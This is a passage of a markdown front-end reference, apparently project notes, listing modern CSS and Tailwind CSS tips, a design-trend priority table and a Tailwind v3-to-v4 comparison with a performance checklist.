  src: url('Inter-Variable.woff2') format('woff2-variations');
  font-weight: 100 900;
}

.responsive-text {
  font-variation-settings: 'wght' 500;
}
```

### Modern Component Patterns

#### 12. Skeleton Loading

```css
.skeleton {
  background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
  background-size: 200% 100%;
  animation: shimmer 1.5s infinite;
}

@keyframes shimmer {
  0% { background-position: 200% 0; }
  100% { background-position: -200% 0; }
}
```

### Implementation Priority for Boekhouder

| Priority | Trend | Tailwind Support |
|----------|-------|------------------|
| **Critical** | WCAG 2.2 Compliance | Built-in focus styles |
| **High** | Dark Mode | `dark:` variants |
| **High** | Reduced Motion | `motion-safe:`/`motion-reduce:` |
| **Medium** | Glassmorphism | `backdrop-blur-*` |
| **Medium** | Micro-Animations | `transition-*`, `animate-*` |

### Resources

- [Tailwind CSS Docs](https://tailwindcss.com/docs)
- [WCAG 2.2](https://www.w3.org/TR/WCAG22/)
- [Muzli Design Trends](https://muz.li/blog/web-design-trends-2026/)

---

## 100 CSS Tips, Best Practices & Modern Features (2025)

### Layout & Positioning (1-15)

1. **Use CSS Grid for 2D layouts, Flexbox for 1D** - Grid excels at rows AND columns; Flexbox is optimal for single-axis alignment
2. **`place-items: center`** - Single property to center items in grid both horizontally and vertically
3. **`gap` works on Flexbox too** - No need for margin hacks; `gap` property now works on flex containers
4. **`min-height: 100dvh`** - Use dynamic viewport height for mobile-friendly full-height layouts
5. **`aspect-ratio`** - Native CSS property eliminates padding-bottom hack for maintaining aspect ratios
6. **Subgrid for nested grids** - Child grids can now inherit parent grid tracks with `grid-template-columns: subgrid`
7. **`display: contents`** - Makes element "invisible" to layout, children behave as direct children of grandparent
8. **`isolation: isolate`** - Creates new stacking context without positioning tricks
9. **`order` property** - Reorder flex/grid items visually without changing HTML structure
10. **`inset: 0`** - Shorthand for `top: 0; right: 0; bottom: 0; left: 0`
11. **`margin-inline: auto`** - Logical property for horizontal centering in any writing mode
12. **`writing-mode` for vertical text** - Rotate text vertically without transforms
13. **`contain: layout`** - Improves performance by isolating element's layout from document
14. **Intrinsic sizing with `fit-content`** - Width/height that fits content up to a maximum
15. **`min()`, `max()`, `clamp()`** - Responsive sizing without media queries

### Container Queries (16-25)

16. **Container queries enable truly modular components** - Style based on parent size, not viewport
17. **`container-type: inline-size`** - Enable container queries on an element
18. **`container-name`** - Name containers for targeted queries with `@container name ()`
19. **`cqw`, `cqi` units** - Container query units relative to container dimensions
20. **Container queries work with Grid** - Combine with auto-fit/auto-fill for powerful layouts
21. **Nest container queries** - Multiple levels of container-responsive components
22. **Use for card components** - Perfect for cards that appear in different contexts (sidebar vs main)
23. **Container style queries** - Query custom property values with `@container style(--theme: dark)`
24. **Container queries don't need media queries** - Many responsive patterns are now container-based
25. **Fallback gracefully** - Use `@supports (container-type: inline-size)` for progressive enhancement

### Modern Selectors (26-35)

26. **`:has()` parent selector** - Style parents based on their children: `article:has(img)`
27. **`:is()` for grouping** - Reduces repetition: `:is(h1, h2, h3) { color: blue }`
28. **`:where()` for zero specificity** - Same as `:is()` but doesn't increase specificity
29. **`:focus-visible`** - Show focus styles only for keyboard navigation
30. **`:focus-within`** - Style parent when any child is focused
31. **`:empty`** - Target elements with no children
32. **`:not()` accepts complex selectors** - `:not(.class1, .class2)` now works
33. **`:nth-child(An+B of selector)`** - Filter nth-child by additional selectors
34. **`@scope` for scoped styles** - Native CSS scoping without Shadow DOM
35. **Attribute selectors with `i` flag** - Case-insensitive matching: `[type="text" i]`

### Colors & Theming (36-50)

36. **`oklch()` for perceptually uniform colors** - Better than HSL for programmatic color manipulation
37. **`color-mix()`** - Blend colors natively: `color-mix(in oklch, blue, red 25%)`
38. **Relative color syntax** - Derive colors: `hsl(from var(--base) h s calc(l + 10%))`
39. **`light-dark()`** - Automatic light/dark values: `color: light-dark(black, white)`
40. **`color-contrast()`** - Auto-select accessible foreground color
41. **Wide gamut colors with `display-p3`** - More vibrant colors on modern displays
42. **CSS custom properties for themes** - `:root { --primary: #3b82f6 }` enables easy theming
43. **`@media (prefers-color-scheme)`** - System-level dark mode detection
44. **`color-scheme` property** - Inform browser about supported color schemes
45. **`currentColor` keyword** - Inherit color value for borders, shadows, SVG fills
46. **`accent-color`** - Style form controls (checkboxes, radios, range) with one property
47. **`forced-colors` media query** - Adapt for Windows High Contrast Mode
48. **Transparent colors in `oklch`** - `oklch(50% 0.2 250 / 0.5)` for transparency
49. **Named color layers** - Use `@layer` to organize theme styles
50. **Color tokens with fallbacks** - `var(--primary, #3b82f6)` provides defaults

### Typography (51-60)

51. **`text-wrap: balance`** - Evenly distribute text across lines for headings
52. **`text-wrap: pretty`** - Prevent orphans at end of paragraphs
53. **Fluid typography with `clamp()`** - `font-size: clamp(1rem, 4vw, 2.5rem)`
54. **Variable fonts reduce file size** - One file for all weights/styles
55. **`font-variation-settings`** - Fine-tune variable font axes
56. **`line-clamp`** - Truncate multi-line text with ellipsis (now standard, not just `-webkit-`)
57. **`font-display: swap`** - Prevent invisible text during font loading
58. **`text-underline-offset`** - Control distance between text and underline
59. **`text-decoration-thickness`** - Adjust underline/strikethrough thickness
60. **`initial-letter`** - Create drop caps for paragraphs

### Animations & Transitions (61-75)

61. **View Transitions API** - Smooth page transitions natively in CSS
62. **Scroll-driven animations** - Animate based on scroll position without JavaScript
63. **`animation-timeline: scroll()`** - Tie animation progress to scroll
64. **`animation-timeline: view()`** - Trigger when element enters viewport
65. **`@starting-style`** - Define initial state for entry animations
66. **`transition-behavior: allow-discrete`** - Transition `display` and `visibility`
67. **`discrete` timing function** - Jump between values for step animations
68. **Hardware-accelerated properties** - Animate `transform`, `opacity` for performance
69. **`will-change` sparingly** - Hint browser about animations, but don't overuse
70. **Cubic bezier for natural motion** - `cubic-bezier(0.34, 1.56, 0.64, 1)` for spring effect
71. **`prefers-reduced-motion`** - Disable/reduce animations for accessibility
72. **Staggered animations with `nth-child`** - Delay based on element index
73. **`animation-fill-mode: forwards`** - Keep final state after animation
74. **CSS-only scroll snap animations** - Combine `scroll-snap` with scroll-driven animations
75. **`@keyframes` with percentages** - Fine-grained control over animation timing

### Performance (76-85)

76. **`content-visibility: auto`** - Skip rendering off-screen content
77. **`contain` property** - Isolate elements for rendering optimization
78. **Critical CSS inline** - Inline above-the-fold CSS, lazy-load the rest
79. **Avoid `@import` in CSS** - Use `<link>` tags for parallel loading
80. **Minimize reflows** - Batch DOM reads/writes, avoid layout thrashing
81. **Composite-only animations** - Transform and opacity trigger GPU, not layout
82. **CSS containment with `contain: strict`** - Maximum isolation for widgets
83. **Lazy load background images** - Use `loading="lazy"` on `<img>` or Intersection Observer
84. **Font subsetting** - Include only characters you need in font files
85. **Use modern image formats** - WebP/AVIF with CSS fallbacks via `@supports`

### Accessibility (86-95)

86. **Minimum 4.5:1 contrast ratio** - WCAG AA for body text
87. **44x44px touch targets** - Minimum size for interactive elements
88. **Focus indicators visible** - Never remove outlines without replacement
89. **Screen reader-only text** - `.sr-only` class for visually hidden but accessible content
90. **Skip links** - First focusable element should skip to main content
91. **`prefers-contrast` media query** - Respect user high contrast preferences
92. **Color alone shouldn't convey meaning** - Use icons/text alongside color
93. **Logical properties for RTL** - `margin-inline-start` works in any direction
94. **`prefers-reduced-transparency`** - Respect user preferences for solid colors
95. **Form label associations** - Style labels connected to inputs via `:has`

### Modern CSS Features (96-100)

96. **Native CSS nesting** - Write nested selectors without preprocessors
97. **`@layer` for cascade control** - Define style priority explicitly
98. **`@property` for typed variables** - Animate custom properties with type definitions
99. **`@import` with layer** - `@import url() layer(base)` for organized imports
100. **CSS Anchor Positioning** - Position tooltips/popovers relative to triggers

---

## 100 Tailwind CSS Tips, Best Practices & Modern Features (2025)

### Core Concepts (1-15)

1. **Utility-first speeds development** - Compose styles directly in HTML without context switching
2. **Mobile-first by default** - Unprefixed classes apply to all sizes, `md:` and up are breakpoint modifiers
3. **`@apply` sparingly** - Use for repeated patterns only; prefer component extraction
4. **JIT mode is default** - Arbitrary values like `w-[137px]` work out of the box
5. **Tailwind v4 uses CSS-first config** - Define tokens in `@theme` directive in CSS
6. **`!important` modifier** - Prefix with `!` like `!text-red-500` for specificity override
7. **Design tokens via theme** - All values come from centralized theme configuration
8. **PurgeCSS built-in** - Unused styles automatically removed in production
9. **Prettier plugin for class sorting** - `prettier-plugin-tailwindcss` organizes classes
10. **VSCode IntelliSense extension** - Autocomplete, linting, and hover preview
11. **Never concatenate class names** - `bg-${color}-500` breaks purging; use complete strings
12. **Group hover states** - `group-hover:` modifier for child elements when parent hovers
13. **Peer selectors** - `peer-checked:` style siblings based on peer state
14. **Arbitrary properties** - `[mask-type:luminance]` for any CSS property
15. **Theme function in CSS** - `theme('colors.blue.500')` accesses config values

### Responsive Design (16-25)

16. **Breakpoint modifiers are min-width** - `md:flex` means "flex at md and above"
17. **Custom breakpoints** - Extend theme with your own screen sizes
18. **Max-width variants** - Use `max-md:` for mobile-only styles (v3.4+)
19. **Container class** - Responsive max-width container, customizable per breakpoint
20. **Responsive spacing** - `p-4 md:p-6 lg:p-8` for progressive spacing
21. **Hide/show with responsive** - `hidden md:block` for mobile-hidden elements
22. **Responsive grid columns** - `grid-cols-1 md:grid-cols-2 lg:grid-cols-3`
23. **Responsive typography** - `text-sm md:text-base lg:text-lg`
24. **Portrait/landscape variants** - `portrait:` and `landscape:` modifiers
25. **Print styles** - `print:hidden` for print-specific styling

### Spacing & Sizing (26-35)

26. **Spacing scale is 4px-based** - `p-1` = 4px, `p-4` = 16px, `p-8` = 32px
27. **Negative values** - `-mt-4` for negative margin-top
28. **Space utilities** - `space-y-4` adds margin between children
29. **Divide utilities** - `divide-y` adds borders between children
30. **Auto and fraction values** - `w-auto`, `w-1/2`, `w-full`
31. **Min/max sizing** - `min-w-0`, `max-w-prose` for content width constraints
32. **Arbitrary spacing** - `m-[23px]` for exact values outside scale
33. **Size shorthand** - `size-8` equals `w-8 h-8`
34. **Inset shorthand** - `inset-0` for `top-0 right-0 bottom-0 left-0`
35. **Container padding** - Configure container with padding in theme

### Colors & Backgrounds (36-50)

36. **Color palette is curated** - Each color has 50-950 shades
37. **Opacity modifiers** - `bg-blue-500/50` for 50% opacity
38. **Arbitrary colors** - `bg-[#1da1f2]` for custom hex values
39. **Current color** - `fill-current` uses `currentColor`
40. **Transparent** - `bg-transparent` for transparent backgrounds
41. **Gradient utilities** - `bg-gradient-to-r from-blue-500 to-purple-500`
42. **Gradient stops** - `via-green-500` for middle color stops
43. **Gradient positions** - `from-10% via-30% to-90%` for precise stops
44. **Background position** - `bg-center`, `bg-top`, custom with `bg-[center_top]`
45. **Background size** - `bg-cover`, `bg-contain`, `bg-auto`
46. **Multiple backgrounds** - Use arbitrary values for layered backgrounds
47. **Backdrop filters** - `backdrop-blur-xl` for frosted glass effect
48. **Mix blend modes** - `mix-blend-multiply` for blend effects
49. **Ring utilities** - `ring-2 ring-blue-500` for focus rings
50. **Ring offset** - `ring-offset-2 ring-offset-white` for gap between element and ring

### Typography (51-60)

51. **Font size includes line-height** - `text-base` sets both font-size and line-height
52. **Font weight** - `font-light` through `font-black`
53. **Text alignment** - `text-left`, `text-center`, `text-right`, `text-justify`
54. **Line height overrides** - `text-lg/7` for custom line height with size
55. **Letter spacing** - `tracking-tight`, `tracking-wide`
56. **Prose plugin** - `@tailwindcss/typography` for rich text styling
57. **Text overflow** - `truncate` for single line, `line-clamp-3` for multi-line
58. **Text decoration** - `underline`, `line-through`, `no-underline`
59. **Text transform** - `uppercase`, `lowercase`, `capitalize`
60. **Font feature settings** - Use arbitrary values for OpenType features

### Flexbox & Grid (61-70)

61. **Flex utilities** - `flex-1` (grow+shrink), `flex-none` (no flex)
62. **Flex direction** - `flex-row`, `flex-col`, with reverse variants
63. **Justify and align** - `justify-center`, `items-center`, `content-start`
64. **Flex wrap** - `flex-wrap`, `flex-nowrap`
65. **Order utilities** - `order-first`, `order-last`, `order-2`
66. **Grid template** - `grid-cols-3`, `grid-rows-2` for tracks
67. **Grid span** - `col-span-2`, `row-span-full`
68. **Grid start/end** - `col-start-2`, `col-end-4` for placement
69. **Auto-fit/auto-fill** - Use arbitrary values: `grid-cols-[repeat(auto-fit,minmax(200px,1fr))]`
70. **Place utilities** - `place-items-center`, `place-content-center`

### Effects & Filters (71-80)

71. **Box shadow** - `shadow-sm` through `shadow-2xl`
72. **Drop shadow** - `drop-shadow-lg` for filter-based shadows (works on images)
73. **Blur** - `blur-sm` through `blur-3xl`
74. **Brightness/contrast** - `brightness-75`, `contrast-125`
75. **Grayscale/sepia** - `grayscale`, `sepia` filters
76. **Invert** - `invert` for inverted colors
77. **Saturate** - `saturate-150` for vivid colors
78. **Hue rotate** - `hue-rotate-90` for color shifting
79. **Backdrop filters** - All filters work with `backdrop-` prefix
80. **Filter composition** - Combine multiple: `blur-sm brightness-110 saturate-150`

### Interactivity & States (81-90)

81. **Hover, focus, active** - `hover:bg-blue-600`, `focus:ring-2`, `active:scale-95`
82. **Focus-visible** - `focus-visible:ring-2` for keyboard focus only
83. **Focus-within** - `focus-within:ring-2` when child is focused
84. **Disabled state** - `disabled:opacity-50 disabled:cursor-not-allowed`
85. **Group/peer states** - `group-hover:`, `peer-checked:`
86. **First/last/odd/even** - `first:pt-0`, `odd:bg-gray-50`
87. **Empty state** - `empty:hidden` for empty elements
88. **Autofill styling** - `autofill:bg-yellow-100`
89. **Placeholder** - `placeholder:text-gray-400`
90. **Selection** - `selection:bg-blue-500 selection:text-white`

### Dark Mode & Variants (91-100)

91. **Dark mode** - `dark:bg-gray-900` for dark theme styles
92. **Class strategy** - Configure `darkMode: 'class'` for manual toggle
93. **Media strategy** - `darkMode: 'media'` follows system preference
94. **Data attribute variants** - `data-[state=active]:bg-blue-500`
95. **ARIA variants** - `aria-selected:bg-blue-500`
96. **Supports queries** - `supports-[backdrop-filter]:backdrop-blur`
97. **Motion variants** - `motion-reduce:transition-none`
98. **Contrast variants** - `contrast-more:border-2`
99. **RTL support** - `rtl:space-x-reverse` for right-to-left
100. **Custom variants** - Create with `addVariant()` in config

---

### Quick Reference: Tailwind v4 Changes

| Tailwind v3 | Tailwind v4 |
|-------------|-------------|
| `tailwind.config.js` | `@theme` directive in CSS |
| `!h-10` | `h-10!` |
| `mr-[var(--x)]` | `mr-(--x)` |
| Configure content paths | Automatic content detection |
| `bg-opacity-50` | `bg-blue-500/50` (already in v3) |

### Performance Checklist

- [ ] Use `@tailwindcss/container-queries` plugin for container queries
- [ ] Install `prettier-plugin-tailwindcss` for consistent class ordering
- [ ] Enable CSS minification in production
- [ ] Use `content` config to include all template files
- [ ] Avoid `@apply` in component libraries
- [ ] Leverage arbitrary values instead of custom CSS
- [ ] Use `prefers-reduced-motion` with `motion-reduce:` variant

